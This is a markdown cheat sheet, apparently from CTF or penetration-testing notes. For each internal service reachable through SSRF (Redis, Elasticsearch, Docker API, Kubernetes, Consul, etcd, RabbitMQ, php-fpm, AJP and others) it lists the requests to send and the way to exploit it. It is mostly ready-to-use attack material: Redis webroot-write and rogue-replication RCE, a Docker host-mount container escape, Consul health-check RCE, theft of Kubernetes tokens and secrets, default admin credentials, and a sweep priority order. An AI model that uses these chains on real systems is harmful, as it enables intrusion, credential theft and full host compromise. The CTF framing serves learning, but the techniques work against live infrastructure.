# Internal services — what each open port actually gives you

The port-sweep finds the door; this file is what's behind each.
Ordered by how often they carry the flag.

---

## 1. Redis — 6379 — the flagship SSRF target

```text
fingerprint:  PING → +PONG ; INFO → the info-dump ; sends -ERR to
              garbage — tolerant line-protocol
reach:        http:// (CRLF-in-path), gopher://, dict://
gold:         flag-KEYS, webroot-write, module-load, ssh-key write
```

```text
inline:       _GET flag  _KEYS *  _CONFIG GET dir  _EVAL "..." 0
resp/gopher:  gopher_gen redis "EVAL" "return redis.call('get','flag')" "0"
write:        _CONFIG SET dir /var/www/ ; _SET x "..." ; _SAVE
slaveof:      rogue-master replication → module-load → RCE (the
              modern chain — redis ≥4 replication-downloads a module)
```

`EVAL` runs lua — `redis.call('get','flag')` — read a key without
knowing the protocol — the single most valuable command.

## 2. Elasticsearch — 9200 — pure-HTTP goldmine

```text
fingerprint:  GET / → {"name":..., "cluster_name":..., "version":...}
reach:        http:// — it's already HTTP — no scheme tricks
```

```text
GET /_cat/indices?v                    — the index-inventory
GET /_cat/aliases
GET /_all/_search?pretty&size=100      — dump everything
GET /<idx>/_search?pretty&size=100
GET /_search?q=flag                    — full-text for "flag"
GET /_search?q=flag:*&pretty
GET /<idx>/_doc/<id>
GET /_cluster/health
GET /_cluster/state?pretty             — the whole cluster-state
GET /_nodes/stats
GET /_cat/shards
GET /_cat/allocation
GET /_security/user?pretty              — x-pack — users (if auth off)
PUT /x/_doc/1 {...}                    — WRITE — a doc — defacement/
                                          stored-content — or a
                                          marker to prove write
POST /<idx>/_update/<id>
GET /_snapshot/                        — snapshots — backups?
GET /_scripts/                          — stored-scripts — code!
POST /_scripts/<id>                    — write a script — RCE-ish
                                          via groovy/painless —
                                          version-gated
```

`q=flag` full-text-search — the flag IS a document — `/_search?q=*`
dumps everything when small.

## 3. Docker API — 2375 — the control-plane

```text
fingerprint:  GET /version → {"Version":..., "ApiVersion":...}
              GET /info → the daemon-info
```

```text
GET /containers/json                    — the container-list
GET /containers/<id>/json               — inspect — env-vars! mounts!
GET /containers/<id>/logs?stdout=1&stderr=1 — the container's logs —
                                            FLAG IN THE LOG OUTPUT!
GET /containers/<id>/top
GET /containers/<id>/changes
GET /images/json
GET /networks
GET /volumes
POST /containers/create?name=x {…}     — spawn — HOST-MOUNT the
                                          flag-path → container-escape!
POST /containers/<id>/start
GET /containers/<id>/attach?logs=1
POST /exec {…}  + POST /exec/<id>/start — exec in a container — RCE
```

The container-spawn chain: `POST /containers/create` with
`"Binds":["/:/host"]` + a command that reads `/host/flag` → the
container shares the host-fs → flag out through logs — full
container-escape — the docker-socket is root-equivalent.

## 4. Kubernetes — 6443/443 — the cluster-api

```text
the SA-token file first:
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
then the api (token in Authorization: Bearer — needs header-
control — gopher-for-http or a fetcher that forwards headers):

GET https://kubernetes.default.svc/api/v1/namespaces
GET https://kubernetes.default.svc/api/v1/namespaces/x/secrets
GET https://kubernetes.default.svc/api/v1/secrets
GET https://kubernetes.default.svc/api/v1/pods
GET https://kubernetes.default.svc/apis/apps/v1/deployments
GET https://kubernetes.default.svc/api/v1/namespaces/x/secrets/flag
   — k8s-secrets are base64 — decode → FLAG
```

## 5. Consul — 8500 — the kv-store

```text
GET /v1/agent/services          — the service-catalog
GET /v1/agent/members
GET /v1/catalog/services
GET /v1/catalog/nodes
GET /v1/kv/?recurse&raw         — ALL kv-entries — secrets live here
GET /v1/kv/flag?raw
GET /v1/kv/<key>?raw
GET /v1/health/services
GET /v1/status/leader
GET /v1/status/peers
PUT /v1/kv/x  body=y            — write a key
POST /v1/agent/check/register — register-check — script-checks run
                                  commands → RCE via health-check!
GET /v1/agent/self
```

The check-register RCE: `PUT /v1/agent/check/register` with a
script-type health-check → the agent EXECUTES it — consul-RCE.

## 6. etcd — 2379 — the k8s-config

```text
GET /v2/keys/                     — the key-tree root
GET /v2/keys/?recursive=true      — EVERYTHING — secrets/secrets
GET /v2/keys/flag
GET /v2/keys/registry/secrets     — k8s-secrets — base64-values
GET /v2/keys/registry/configmaps
GET /version
GET /v2/stats/leader
GET /v2/members
v3-API (grpc-gateway on 2379):
POST /v3/kv/range {"key":""}     — v3 — base64-keys
POST /v3/kv/put
```

`?recursive=true` — the whole-tree dump — k8s-secrets sit at
`/registry/secrets/...` — base64 → decode → flag.

## 7. Memcached — 11211

```text
stats / stats items / stats cachedump <slab> <n> / get <key>
lru_crawler metadump all — the key-inventory
reach: dict://, gopher://, http:// (tolerates garbage-lines)
```

## 8. MongoDB — 27017

```text
binary wire-protocol — http:// can't speak it — BUT:
  - the wire-banner leaks in the response — fingerprint
  - the HTTP-interface (mongod --httpinterface, removed ~3.2) —
    if present → http://127.0.0.1:28017/ — REST-ish —
    serverStatus/listDatabases — CTF-images with the old flag on
gopher can't compose the binary handshake usefully — mongo via
SSRF is mostly fingerprint + old-httpinterface
```

## 9. MySQL — 3306

```text
binary protocol — the greeting-packet (version+salt+capabilities)
leaks in ANY connection's first bytes → gopher/http-banner gives
the mysql-version — fingerprint
the login-handshake is binary + challenge-response — can't speak
it over a URL — BUT mysql-server will record your login-attempt —
and mysql-clients can be tricked INTO a rogue-server:
  - rogue-mysql-server: run your own mysqld-ish that requests a
    file-load from the client → SSRF can't act as a client-usefully
    — skip — not a read-path
```

## 10. PostgreSQL — 5432

```text
binary — same story — startup-message + error-banner — fingerprint
gopher can't build a valid startup-packet usefully — limited to
fingerprint + port-confirmation
```

## 11. RabbitMQ — 15672 (mgmt) / 5672 (amqp)

```text
GET http://127.0.0.1:15672/api/overview          — mgmt-http —
                                              guest:guest default!
GET /api/whoami
GET /api/vhosts
GET /api/queues
GET /api/queues/<vhost>/<name>/get — POST actually — read msgs —
                                   flag-in-a-message!
GET /api/exchanges
GET /api/users                      — user-list — needs auth
GET /api/connections
```

`guest:guest` works on loopback-only by default — and the SSRF
originates FROM loopback — the auth-check passes!

## 12. php-fpm — 9000 — FastCGI

```text
binary FastCGI records — gopher-carryable — the auto_prepend chain
→ the worker runs your php → RCE — see fastcgi-gopher.md / gopher-deep.md
```

## 13. AJP — 8009 — the Ghostcat port

```text
Apache JServ Protocol — binary — tomcat's frontend-channel —
Ghostcat (CVE-2020-1938) → LFI/read-webroot via crafted AJP —
the packet is binary — gopher-carryable but complex — the known
chain: AJP with attributes javax.servlet.include.request_uri etc
→ tomcat reads a file → returns it — scripted AJP packets —
documented in web-lfi/tomcat writeups
```

## 14. The admin-consoles — HTTP-speaking

```text
:8161  activemq-admin     /admin/queues.jsp   — default admin:admin
:5601  kibana             /app/dev_tools      — the console → es-cmds
:3000  grafana            /api/health /login — default admin:admin —
                          /api/datasources → datasource-creds!
:8080  jenkins-alt/tomcat /manager/html — tomcat-manager — deploy!
:9990  wildfly-mgmt       /management — jboss-inventory
:7001  weblogic           /console — weblogic-console
:8888  jupyter            /tree /api — jupyter-notebook — TERMINAL-
                          ACCESS if no token → RCE-via-kernel!
:8025  mailhog            /api/v2/messages — the captured-mail —
                          flag-in-an-email!
:8025  mailhog            /api/v1/messages
:8081  spring-actuator?   /actuator/env — see internal-pivot.md
:50070 hadoop-namenode    /webhdfs/v1/?op=LISTSTATUS — hdfs-read!
:50075 hadoop-datanode
:8042  yarn-nodemanager
:8088  yarn-resourcemanager /ws/v1/cluster/apps — cluster-jobs
:4040  spark-ui           /api/v1/applications — job-logs
:18080 spark-history      /api/v1/applications
:4040  spark              /stages /environment — env-vars in /environment!
:9083  hive-metastore
:60010 hbase-master
:16010 hbase-master
:9010  solr-admin         /solr/admin/cores?action=STATUS — cores —
                          /solr/<core>/select?q=*:* — the index-dump!
:8983  solr               same — /solr/<core>/select?q=flag
:7474  neo4j              /db/data — cypher-http — :7474/db/neo4j/tx
:7687  neo4j-bolt (binary)
:8529  arangodb           /_api/collection — /_api/document
:2480  orientdb           /listDatabases — /document/<db>/x
:8091  couchbase-admin    /pools/default — /pools/default/buckets
:8092  couchbase-api      <bucket>/_all_docs
:9411  zipkin             /api/v2/services — trace-data — request-
                          contents in the traces! — flag-in-a-trace
:16686 jaeger-ui          /api/services — /api/traces — trace-data
:4317  otlp (grpc)
:4318  otlp-http
:9090  prometheus         /api/v1/targets /api/v1/query?query=up
:9093  alertmanager       /api/v1/alerts
:9100  node-exporter      /metrics — host-metrics — not flag-shaped
                          usually — but /metrics leaks env-sometimes
:20048 nfs-mountd?        mount-daemon
:50070 hadoop
:2375  docker — covered
:8500  consul — covered
:9200  es — covered
:6379  redis — covered
:11211 memcached — covered
```

## 15. The mail/print/mgmt ends

```text
:25   smtp       — HELO/EHLO/MAIL — gopher-dialogue — send-mail
:110  pop3       — USER/PASS/LIST/RETR — read-mail — the flag-mail!
:143  imap       — LOGIN/SELECT/FETCH — read-mail
:515  lpd        — print-queue — jobs
:631  ipp/cups   — http-ipp — printers/jobs — /jobs /printers
:17185 vxworks-wdb?
:161  snmp (udp — tcp-snmp on some) — can't reach udp via url-fetch
:53   dns — udp — mostly unreachable via tcp-fetch
:2049 nfs — rpc — binary — can't speak usefully
:111  rpcbind — rpc — binary
:3260 iscsi — binary
```

## 16. The vuln-service ends — non-stock services

```text
CTF-drops often run a SECOND service the flag actually lives on:
  - a second webapp on :8081/:5000 — the "internal admin" — fetch
    its /flag directly
  - a custom tcp-service on an odd port — the port-sweep finds it,
    gopher speaks its line-protocol
  - a gRPC service — http2-binary — hard over url-fetch
  - a unix-socket — needs the unix-aware fetcher (docker-clients)
```

## 17. The fingerprint-table — response → service

```text
"+PONG" / "-ERR unknown"                     → redis
"ERROR" / "VERSION x"                         → memcached
"SSH-2.0-..."                                 → ssh-banner
"220 ..."                                     → smtp/ftp-banner
binary + version-string                        → mysql/pg/mongo
{"name":..., "cluster_name":...}               → elasticsearch
{"Version":..., "ApiVersion"}                  → docker-api
html + "Apache Status"/"nginx"                  → status-page
html + "Grafana"/"Kibana"/"Jenkins"             → the console
html + "Solr"                                  → solr-admin
{"version":..., "consul"}                      → consul
4-letter-word response                          → zookeeper
FCGI binary                                     → php-fpm
"Zookeeper version"                             → zk
xml + "methodResponse"                          → xmlrpc/supervisord
```

## 18. The priority-order — which ports first

```text
1. 6379 redis       — line-protocol → everything reachable
2. 9200 es          — pure http → instant dump
3. 2375 docker      — control-plane → container-escape
4. 8500 consul      — kv → secrets
5. 2379 etcd        — k8s-config → secrets
6. <app-port>       — the loopback-admin route
7. 15672 rabbitmq   — mgmt → guest:guest
8. 11211 memcached  — keys
9. 169.254.169.254  — metadata — wait that's not a port on
                      loopback — the metadata-IP is a remote-
                      address — fetch it directly by IP
10. 9000 php-fpm    — gopher-fcgi — RCE
```

The sweep order: metadata-IP → loopback-common-ports → the
subnet-neighbors → fingerprint what answers → chain per service.
